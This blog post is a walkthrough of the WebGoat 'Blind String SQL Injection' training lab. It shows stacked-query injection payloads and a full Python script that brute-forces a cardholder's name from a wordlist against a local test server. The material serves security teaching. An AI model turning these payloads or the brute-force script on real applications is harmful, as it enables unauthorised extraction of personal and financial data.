---
layout: post
title:  "OWASP BWA WebGoat Challenge: Injection Flaws"
subtitle: "Blind SQL Injection (String)"
date:   2017-01-30 07:00:00 -0500
author: "coastal"
header-img: "images/site-resources/webgoat-header.jpg"
---
# Blind String SQL Injection 
Instructions:

- The form below allows a user to enter an account number and determine if it is valid or not. Use this form to develop a true / false test check other entries in the database.
- Reference Ascii Values: 'A' = 65 'Z' = 90 'a' = 97 'z' = 122
- The goal is to find the value of the field name in table pins for the row with the cc_number of 4321432143214321. The field is of type varchar, which is a string.
- Put the discovered name in the form to pass the lesson. Only the discovered name should be put into the form field, paying close attention to the spelling and capitalization.

Building off of the last challenge for Blind Numeric SQL Injection, let's design a request to find the name of the owner of credit card ```4321432143214321```. Let's check out our first request again:

```
account_number=101&SUBMIT=Go%21
```
Alright, same as before. Let's try to append our blind query onto that request now:

```
101;select * from pins where cc_number = 4321432143214321--
```

And let's add our brute-force section:

```
101;select * from pins where cc_number = 4321432143214321 and name = x--
```

The problem with this is that we don't know how long the name is. Additionally, compared to with numbers, the amount of guesses that are required to brute-force a string of the same length is 45-fold at only 4 characters, and 118-fold at 5 characters (and that is assuming they used no capitals or a leading capital letter in their name):

```
26**4 / 10**4 = 45
26**5 / 10**5 = 118
```

So clearly we have a huge entropy issue. How can we cut this down to an attainable level? Because my laptop certainly doesn't have the NSA's brute-force power. I found the answer, again, in wordlists. With a quick [google search][crackers-namelist] I was able to find a pretty substantial wordlist of common names. Now let's modify our wordlist brute-force script into a Blind String SQL Injection machine:

{% highlight python %}
import sys
import requests

wordlist_paths = [
	"another-long-path/names.txt",
]


def main():
	namelist = []
	print "[+] Populating the namelist ..."
	for wordlist_path in wordlist_paths:
		print "	[*] Populating from list: {}".format(wordlist_path.split("/")[-1])
		with open(wordlist_path, "r") as wordlist_file:
			word_data = wordlist_file.read()
			namelist += word_data.splitlines()
	print "	[*] Checking that wordlist was populated"
	if  len(namelist) == 0:
		print "[-] Wordlist was not populated... Exiting"
		sys.exit(1)
	print "[+] Wordlist populated successfully"

	headers = {
		"user-agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0"
	}
	cookies = dict(JSESSIONID="9807FE50B02B2B1D50B8113FFB60D0DC",acopendivids="swingset,jotto,phpbb2,redmine",acgroupswithpersist="nada")

	for index,name in enumerate(namelist):
		capitalized_name = name[0].upper() + name[1:]
		print ("[*] Attempt {} | Name: {}".format(index, capitalized_name))
		attempt = "101;select * from pins where cc_number = 4321432143214321 and name = '{}'--".format(capitalized_name)
		payload= {"account_number":attempt,"SUBMIT":"Go%21"}
		r = requests.post("http://192.168.56.101/WebGoat/attack?Screen=13&menu=1100", params=payload, headers=headers, cookies=cookies)
		if r.status_code == 200:
			if "account number is valid" in r.text.lower():
				print ("[+] SUCCESS! Name is: {}".format(capitalized_name))
				sys.exit(0)
		else:
			print ("error: {}".format(r.text))
			sys.exit(1)

main()
{% endhighlight %}

Awesome, let's give it a run!

<img src="{{ site.baseurl }}/images/2017-01-30-webgoat_part_15/brute-string-failure.jpg">

Oh man...That's a bummer. Now it could be a few things causing this failure, one of which would be a non-comprehensive wordlist. Somehow I decided this was probably not the case though. I didn't think that the capitalization would be on any letter but the first, as all previous challenges did not have that pattern. I thought that the most likely source of failure was the formatting of the SQLi statement. Looking it over, I realized that I had not string-escaped our ```name``` guesses! Let's change that and cross our fingers...

```
101;select * from pins where cc_number = 4321432143214321 and name = 'x'--
```

<img src="{{ site.baseurl }}/images/2017-01-30-webgoat_part_15/brute-string-success.jpg">

Awesome! Wordlists and Python strike again.

### References

[1. Cracker's Namelist][crackers-namelist]

[crackers-namelist]:http://www.outpost9.com/files/wordlists.html